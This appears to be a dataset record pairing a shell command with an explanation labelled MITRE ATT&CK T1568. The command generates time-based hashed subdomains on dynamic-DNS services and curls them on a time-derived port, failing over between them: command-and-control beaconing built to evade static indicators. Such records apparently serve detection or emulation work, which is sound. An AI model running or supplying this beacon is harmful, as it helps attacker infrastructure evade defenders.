command: s=$(date -u +%s); h1=$(echo -n "$s-1" | sha256sum | cut -c1-12); h2=$(echo -n "$s-2" | sha256sum | cut -c1-12); h3=$(echo -n "$s-3" | sha256sum | cut -c1-12); port=$(( 20000 + ($s % 20000) )); d1="$h1.dynu.net"; d2="$h2.duckdns.org"; d3="$h3.ddns.net"; curl --connect-timeout 3 "https://$d1:$port/health" || curl --connect-timeout 3 "https://$d2:$port/health" || curl --connect-timeout 3 "https://$d3:$port/health"
explanation: Generates three time-based DGA candidates and attempts them in sequence, with a time-derived port, to leverage dynamic resolution and increase resiliency. This is characteristic of T1568.
rationale_steps: Hash time-based seeds into multiple candidate subdomains.
Compute a port number from the epoch time.
Attempt curl to the first DGA domain; failover to others.
Rely on DNS resolution at runtime to avoid static indicators.
